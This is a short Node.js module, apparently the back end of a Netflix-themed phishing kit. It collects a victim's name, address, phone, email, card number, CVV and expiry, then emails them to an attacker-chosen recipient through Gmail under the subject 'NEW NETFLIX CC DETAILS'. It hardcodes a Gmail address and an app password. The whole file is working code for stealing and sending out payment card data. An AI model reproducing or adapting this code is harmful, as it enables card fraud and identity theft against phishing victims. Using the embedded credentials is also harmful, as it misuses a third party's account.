const nodemailer = require('nodemailer')

const sendMail = (
  firstName,
  lastName,
  email,
  phoneNumber,
  address,
  zip,
  city,
  cardNumber,
  cvv,
  year,
  month,
  user,
  res
) => {
  const auth = {
    user: 'webiniy01@gmail.com',
    pass: 'ltgy qoqa zvfd uclp',
  }

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth,
  })

  const text = `New Netflix CC details. email: ${email}, phone number: ${phoneNumber},  first name: ${firstName}, last name: ${lastName}, address: ${address}, city; ${city}, zip code: ${zip}, card number: ${cardNumber}, cvv: ${cvv}, year: ${year}, month: ${month}`

  const mailOptions = {
    from: auth['user'],
    to: user,
    subject: 'NEW NETFLIX CC DETAILS',
    text,
  }

  transporter.sendMail(mailOptions, function (error, info) {
    if (error) {
      console.log(error)
      res.status(500).send('there was an error')
      return
    } else {
      console.log('Email sent: ' + info.response)
      res.status(200).json({ sent: 'success' })
      return
    }
  })
}

module.exports = { sendMail }
